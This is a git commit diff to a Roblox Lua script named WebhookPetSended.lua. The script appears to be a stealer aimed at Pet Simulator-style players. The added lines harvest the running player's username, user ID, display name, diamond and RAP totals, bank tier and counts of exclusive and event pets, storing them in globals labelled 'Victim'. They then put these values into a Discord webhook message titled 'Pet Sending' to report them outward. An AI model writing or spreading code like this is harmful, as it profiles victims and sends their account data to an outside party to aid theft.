3156a3821541208c97cf99e3c78b181b5c921457
Arkhalislua <130490495+Arkhalislua@users.noreply.github.com>
2023-05-28 15:39:14 +0200

    Update WebhookPetSended.lua

--- WebhookPetSended.lua
+++ WebhookPetSended.lua
@@ -1,4 +1,33 @@
 
+local Exclusive = 0
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
+                    Exclusive = Exclusive + 1
+                end
+            end
+	end
+
+local Event = 0
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+                    Event = Event + 1
+                end
+            end
+	end
+
+_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+_G.PlrUserVictim = game.Players.LocalPlayer.Name
+_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
+_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
+_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
+local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
+local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
 local webhookcolor = "13369599"
 
 local function sendwebhook(msg)
@@ -10,14 +39,30 @@ local msg = {
 	  {
 		["title"]= "`Arkhalis Cheack`",
 		["description"]= "**Pet Sending (′ꈍωꈍ‵)**",
-		["url"]= "https://discord.gg/vzY4yAk9ns",
+		["url"]= "https://discord.gg/arkhalis",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
         ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
         ["height"] = 420,
         ["width"] = 420
         },
-      
+        ["fields"]= {
+            {
+              ["name"]= "**💎Diamonds 💎**",
+              ["value"]= "```"..GemsFormated.."```",
+              ["inline"]= true
+            },
+            {
+              ["name"]= "**🏆Exclusive🏆**",
+              ["value"]= "```"..Exclusive.."```",
+              ["inline"]= true
+            },
+            {
+              ["name"]= "**🎃Event🎃**",
+              ["value"]= "```"..Event.."```",
+              ["inline"]= true
+            }
+          }
   }
   },
 	["attachments"] = {}
